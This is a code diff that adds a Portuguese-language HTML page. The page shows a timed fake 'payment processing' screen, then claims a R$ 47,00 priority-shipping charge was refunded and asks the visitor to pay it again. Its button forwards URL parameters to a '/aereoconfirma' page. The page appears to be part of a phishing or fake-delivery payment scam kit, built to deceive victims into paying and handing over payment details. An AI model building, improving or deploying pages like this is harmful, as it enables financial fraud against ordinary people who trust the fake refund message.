@@ -1,0 +1,215 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Página de Reembolso e Novo Pagamento</title>
+    <!-- Fontes do Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Deco&family=Montserrat:wght@700&display=swap" rel="stylesheet">
+    <!-- Link para os ícones do FontAwesome -->
+    <link rel="stylesheet" href="css/jpwqkkZAV4LV.css">
+    <style>
+        /* Reset de margens e padding */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Estilo do corpo */
+        body {
+            font-family: 'Deco', sans-serif;
+            background-color: #f4f4f9; /* Fundo suave e sofisticado */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+            text-align: center;
+        }
+
+        /* Centralizar a parte de pagamento na tela */
+        .container {
+            background-color: #fff;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 450px;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            opacity: 0; /* Inicia invisível para a transição */
+            transition: opacity 1s ease-in-out, transform 1s ease-in-out; /* Transição combinada */
+            position: absolute; /* Garante que a seção fique centralizada */
+        }
+
+        /* Títulos */
+        h1 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 26px;
+            color: #333;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+
+        h2 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 20px;
+            color: #555;
+            margin-bottom: 25px;
+            font-weight: 600;
+        }
+
+        /* Texto de instruções */
+        p {
+            font-size: 16px;
+            color: #666;
+            line-height: 1.8;
+            margin-bottom: 30px;
+            text-align: justify;
+        }
+
+        /* Estilo do botão de pagamento */
+        .btn {
+            background-color: #007bff; /* Azul profissional */
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 18px 28px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.3s;
+            width: 100%;
+            max-width: 270px;
+            margin-top: 20px;
+        }
+
+        /* Efeito de hover no botão */
+        .btn:hover {
+            background-color: #0056b3;
+            transform: translateY(-5px);
+        }
+
+        /* Container de "processando" */
+        .processing {
+            font-size: 18px;
+            color: #333;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .processing i {
+            font-size: 50px;
+            color: #007bff;
+        }
+
+        .processing p {
+            font-size: 16px;
+            color: #555;
+        }
+
+        /* Adicionando um ícone de segurança */
+        .secure-icon {
+            font-size: 40px;
+            color: #28a745; /* Verde de segurança */
+            margin-bottom: 20px;
+        }
+
+        /* Responsividade */
+        @media (max-width: 600px) {
+            .container {
+                padding: 30px;
+            }
+
+            h1 {
+                font-size: 22px;
+            }
+
+            h2 {
+                font-size: 18px;
+            }
+
+            p {
+                font-size: 14px;
+            }
+
+            .btn {
+                padding: 15px 25px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Conteúdo inicial: mensagem de processamento -->
+    <div class="container processing" id="processing-message" style="opacity: 1; transform: translateY(0px);">
+        <i class="fas fa-spinner fa-spin"></i>
+        <h1><strong>Processamento de Pagamento</strong></h1>
+        <p>
+            O seu pagamento está sendo processado. Este procedimento pode levar alguns segundos. Por favor, aguarde...
+        </p>
+    </div>
+
+    <!-- Conteúdo final: página com os dados do reembolso -->
+    <div class="container" id="payment-content" style="display: none;">
+        <i class="fas fa-shield-alt secure-icon"></i> <!-- Ícone de segurança -->
+        <h1><strong>Seu Reembolso foi Processado</strong></h1>
+        <h2><strong>Valor de R$ 47,00 foi reembolsado</strong></h2>
+        <p>
+            O valor de <strong>R$ 47,00</strong> referente ao Envio Prioritário foi reembolsado com sucesso. O crédito será refletido em seu extrato bancário em até 1 dia útil. 
+            Sua segurança e a integridade dos seus dados são nossa prioridade.
+        </p>
+        <p>
+            Para continuar, solicitamos que realize o pagamento novamente do valor de <strong>R$ 47,00</strong>. 
+            Garantimos um processo seguro e eficiente.
+        </p>
+        <button class="btn" onclick="window.location.href='/aereoconfirma?' + new URLSearchParams(window.location.search).toString()">
+        Realizar Pagamento
+        </button>
+    </div>
+
+    <script>
+        // Função que oculta a mensagem de "processando" e exibe o conteúdo final após 7 segundos
+        setTimeout(function() {
+            // Aplicar fade-out na parte de "processando"
+            document.getElementById('processing-message').style.opacity = '0';
+            document.getElementById('processing-message').style.transform = 'translateY(-20px)'; // Transição de deslizamento para cima
+
+            // Exibir a parte de "pagamento" com transição combinada
+            document.getElementById('payment-content').style.display = 'block';
+            setTimeout(function() {
+                document.getElementById('payment-content').style.opacity = '1';
+                document.getElementById('payment-content').style.transform = 'translateY(0)'; // Transição de deslizamento para baixo
+            }, 50); // Pequeno delay para permitir o início do fade-in
+        }, 7000); // 7000 milissegundos = 7 segundos
+
+        // Garantir que a parte de "processando" inicie com a opacidade em 1 e sem transformações
+        document.getElementById('processing-message').style.opacity = '1';
+        document.getElementById('processing-message').style.transform = 'translateY(0)';
+    </script>
+<button class="btn" onclick="realizarPagamento()">
+    Realizar Pagamento
+</button>
+
+<script>
+function realizarPagamento() {
+    // Captura os parâmetros da URL atual
+    const params = new URLSearchParams(window.location.search);
+    
+    // Constrói a nova URL com os parâmetros existentes
+    const urlComParametros = '/aereoconfirma?' + params.toString();
+    
+    // Redireciona para a nova URL
+    window.location.href = urlComParametros;
+}
+</script>
+
+
+
+</body></html>
